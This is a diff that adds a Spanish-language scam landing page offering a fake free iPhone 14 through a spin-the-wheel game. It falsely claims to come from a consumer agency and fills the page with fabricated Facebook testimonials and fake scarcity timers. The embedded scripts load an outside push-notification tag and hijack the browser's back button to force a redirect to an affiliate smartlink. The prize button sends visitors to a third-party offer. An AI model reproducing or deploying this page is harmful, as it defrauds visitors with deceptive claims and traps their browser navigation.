@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="es" dir="ltr">
+  <head>
+    <title>¡Felicidades</title>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="lander" content="prizewheel-fb">
+<meta name="description" content="prizewheel-fb">
+<link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon">
+   
+    <meta
+      name="alert-message"
+      content="Lo sentimos\n\nInténtalo de nuevo. Tienes otra oportunidad!"
+    >
+    <link href="css/app.css?id=2fbe2d9a9a40ca9b2489" type="text/css" rel="stylesheet"/>
+    <link href="css/landers/prizewheel-fb/app.css?id=9e0fbcbab62cd9e8b4db" type="text/css" rel="stylesheet" />
+    
+    
+    
+    
+    <script>
+    //PP
+    var s = document.createElement('script');
+    s.src='//lemouwee.com/pfe/current/micro.tag.min.js?z=5168327'+'&sw=/sw-check-permissions-ea2cf.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
+
+<script> 
+//BB
+function imiBB() { let url = "https://app.impih.com/?utm_medium=de5fa4d2ab158e6e7e7bd8f5532cfbdc0f368965&utm_campaign=Global_smartlink&np=1"; try { history.pushState({}, '', location.href); history.pushState({}, '', location.href); window.onpopstate = function (ev) { if (ev['state']) { location.replace(url); } }; } catch (ex) {} } !function () { let touched = false; let chromeVersion = 0; try { chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]); } catch (e) { chromeVersion = 0; } if (chromeVersion >= 75) { window.addEventListener('mouseup', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.addEventListener("DOMContentLoaded", function () { document.body.addEventListener('touchend', function (evt) { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); document.body.addEventListener('keydown', function () { if (!touched) { touched = true; setTimeout(function () { imiBB(); } , 0); } } ); } ); } else { setTimeout(function () { imiBB(); } , 0); } } (); </script>
+    
+    
+    
+  </head>
+  <body
+      >
+    <main id="app" v-cloak>
+      <div class="header">
+        GIRA Y GANA
+        <img
+          class="header__icon"
+          src="img/landers/prizewheel-fb/notification.png"
+          alt=""
+        />
+      </div>
+      <div class="step" v-if="!hasWon">
+        <div class="card">
+          <div class="step__text">
+            <div class='step__date'>
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+            </div>
+            <h1 class="step__title">
+              ¡¡Felicidades Apple usuario, tienes (1) recompensa pendiente!!
+            </h1>
+            <div class="step__subtitle">
+              Cada <span class="strong">{{ DateHelper().getDayName() }}</span> seleccionamos 10 usuarios afortunados para que reciban una recompensa.
+            </div>
+          </div>
+          <div class="step__bar">
+            Reclama Tu Premio<br/><em>↓</em> Gira la ruleta <em>↓</em>
+          </div>
+          <vue-prize-wheel
+            class="prize-wheel"
+            static-image="img/landers/prizewheel-fb/prizewheel_static.png"
+            prize-image="img/prizes/iphone-14/default@0.5x.png"
+            :start-at="startPrizewheelAt"
+            v-on:lost="retryModalOpen = true"
+            v-on:finish="hasWon = true"
+          >
+            <template v-slot:spinner>
+              <img 
+                src="img/landers/prizewheel-fb/prizewheel_spinner.jpg"
+                class="prize-wheel__wheel"
+                alt=""
+              />
+              <img
+                src="img/prizes/iphone-14/default@0.5x.png"
+                class="prize-wheel__prize"
+                alt=""
+              />
+            </template>
+          </vue-prize-wheel>
+        </div>
+      </div>
+      <div class="step" v-if="hasWon && !isLoaded">
+        <div class="card step__loader">
+          <img src="img/landers/prizewheel-fb/loader.gif" alt="Cargando"/>
+        </div>
+      </div>
+      <div class="step step--end" v-if="isLoaded">
+        <div class="card card--centered">
+          <div class="step__title step__title--bold">
+            ¡Enhorabuena!
+            ¡Sólo tienes que completar estos pasos para recibir tu Apple iPhone 14!
+          </div>
+        </div>
+        <div class="card">
+          <div>
+            1. Haz clic en &#039;Reclamar Premio&#039; para reclamar tu premio. Serás redirigido al sitio web de nuestro socio.</div>
+          <div>
+            2. Sigue los pasos en el sitio web de nuestro socio.
+          </div>
+          <div>
+            <span class="strong">IMPORTANTE:</span>
+            El producto puede dejar de estar disponible en cualquier momento.
+          </div>
+          <div>¡Elige rápido!</div>
+        </div>
+        <div class="card">
+          Oferta válida durante <span><span v-html="countdownMinutes">0</span> minutos y <span v-html="countdownSeconds">0</span> segundos.</span>
+        </div>
+        <div class="card">
+          <div class="step__prize">
+            <div class="step__prize-image">
+              <img 
+                src="img/prizes/iphone-14/default@0.5x.png"
+                class="step__prize-image-image"
+                alt="Apple iPhone 14"
+              />
+              <div>(2) quedan</div>
+            </div>
+            <div class="step__prize-details">
+              <div class="step__title step__title--bold">Apple iPhone 14</div>
+              <div>Precio Normal: 799 USD</div>
+              <div>
+                Tu Precio: 
+                <span class="new-prize">0 USD</span>
+              </div>
+              <!--
+              <span class="step__button" v-on:click="openOfferUrl">Reclamar Premio</span>
+              -->
+              <script>document.write('<a href="https://t2.surpriseanddelightgifts.com/click" class="step__button">Reclamar Premio</a>')</script>
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="comments">
+        <div class="card">
+          <div class="comments__likes">
+            <span class="comments__link">12,068</span> Me gusta totales.
+          </div>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/female/3@0.25x.jpg"
+            name="Mia q"
+            message="Inicialmente no estaba seguro de que esto fuera real, pero ¡¡he recibido el Apple iPhone 14 hoy :D!!"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="ahora"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/male/3@0.25x.jpg"
+            name="Fernandez"
+            message="¿Ganó alguien algo en este sorteo??"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="9 minutos"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/male/10@0.25x.jpg"
+            name="Camila666"
+            message="¿Cómo funciona? Gané una tarjeta de Amazon hace algunos años y todos mis intentos posteriores - sin éxito..."
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="32 minutos"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/female/6@0.25x.jpg"
+            name="Dannak"
+            message="¿Puede ayudarme? ¡¡Acabo de ganar una tarjeta de regalo!! ¿Qué debo hacer ahora?"
+            :likes="12"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="55 minutos"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/male/9@0.25x.jpg"
+            name="Liam"
+            message="¡Apple iPhone 14 ha llegado hoy por correo! ¡¡Gracias a Apple !!"
+            :likes="12"
+            image="img/prizes/iphone-14/proof.jpg"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="1 hora"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/female/5@0.25x.jpg"
+            name="Alessia"
+            message="Vi esta oferta una vez y la rechacé porque pensé que era falsa. Vi el anuncio de nuevo y como estaba aburrido decidí probar ... ¡Y conseguí un NUEVO iPhone X! ¡¡Increible!!?!"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="3 horas"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/female/1@0.25x.jpg"
+            name="Sebastian"
+            message="¿Cómo funciona? Gané una tarjeta de Amazon hace algunos años y todos mis intentos posteriores - sin éxito..."
+            :likes="21"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="3 horas"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <vue-facebook-comment
+            avatar="img/profiles/east-asian/male/2@0.25x.jpg"
+            name="Luis_g"
+            message="No estaba seguro de si sería cierto o no, pero ¡¡recibí mi tarjeta hoy!! 😍 asombroso 🔥 🔥"
+            :likes="1"
+            like-text="Me gusta"
+            reply-text="Respuesta"
+            since-text="6 horas"
+            v-on:reply="$refs.reply.focus()"
+          ></vue-facebook-comment>
+          <p class="card__paragraph comments__link">
+            Ver 83 comentarios anteriores
+          </p>
+        </div>
+        <div class="card">
+          <div class="comments__form">
+            <label for="reply">Añadir respuesta:</label>
+            <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+            <p class="card__paragraph">
+              <button onclick="alert('Gracias por su comentario, será publicado después de ser revisado.');">
+                Enviar
+              </button>
+            </p>
+          </div>
+        </div>
+      </div>
+      <vue-modal :open="welcomeModalOpen" class="modal" v-on:close="welcomeModalOpen = false">
+        <div class="modal__title" style="">Apple iPhone 14</div>
+        <img 
+          class="modal__image"
+          src="img/prizes/iphone-14/default@0.5x.png"
+          alt="Apple iPhone 14"
+        />
+        <p>
+          <span class="strong">
+              {{ DateHelper().getMonthName() }}
+              {{ DateHelper().getDate() }},
+              {{ DateHelper().getYear() }}
+          </span>
+          <br/>
+          ¡Felicidades usuario de Apple!
+          <br/>
+          Centro nacional del Consumidor quiere agradecerle su lealtad.
+          <br/>
+        </p>
+        <p>
+          Gira la ruleta para reclamar tu premio especial 🎁
+          <br>
+          <br>
+          <span class="strong">¡Buena Suerte!</span>
+        </p>
+        <button class="modal__button" v-on:click="welcomeModalOpen = false">Aceptar</button>
+      </vue-modal>
+      <vue-modal :open="retryModalOpen" class="modal" v-on:close="retryModalOpen = false">
+        <div class="modal__title" style="">¡Inténtalo de nuevo!</div>
+        <p>
+          *** Has ganado una tirada extra ***
+        </p>
+        <button class="modal__button" v-on:click="retryModalOpen = false">Aceptar</button>
+      </vue-modal>
+    </main>
+  <!--  
+    <script>window.view = window.view || {};view.offerUrl = "https:\/\/smart.link\/o11ol9wmrcofl?payout=0.12&click_id=6004kwyyftatbny5k080g0cwk,16911697,5,29134";view.popunderUrl = null;view.trafficDomain = "https:\/\/www.tc4asdf.net";view.qs = "payout=0.12&click_id=6004kwyyftatbny5k080g0cwk,16911697,5,29134";view.skip = 0;view.screenshot = 0;view.download = 0;view.noHistory = 0;view.noredir = false;</script>
+    -->
+    
+    
+    <script>window.view = window.view || {};view.datetimeTranslations = {"ago":"hace :time","from_now":"dentro de :time","after":":time despu\u00e9s","before":":time antes","year":"1 a\u00f1o|:count a\u00f1os","month":"1 mes|:count meses","week":"1 semana|:count semanas","day":"1 d\u00eda|:count d\u00edas","hour":"1 hora|:count horas","minute":"1 minuto|:count minutos","second":"1 segundo|:count segundos","january":"enero","february":"febrero","march":"marzo","april":"abril","may":"mayo","june":"junio","july":"julio","august":"agosto","september":"septiembre","october":"octubre","november":"noviembre","december":"diciembre","monday":"lunes","tuesday":"martes","wednesday":"mi\u00e9rcoles","thursday":"jueves","friday":"viernes","saturday":"s\u00e1bado","sunday":"domingo"};</script>    
+    
+
+
+
+
+
+    
+    
+    <script src="js/app.js?id=d95b2f380a2918b995e8" type="application/javascript"></script>
+        <script src="js/private.js?id=1416ba8f8f585d65ae70" type="application/javascript"></script>
+        <script
+      src="js/landers/prizewheel-fb/app.js?id=83c995758eaf2c51e16f"
+      type="application/javascript">
+    </script>
+  </body>
+</html>
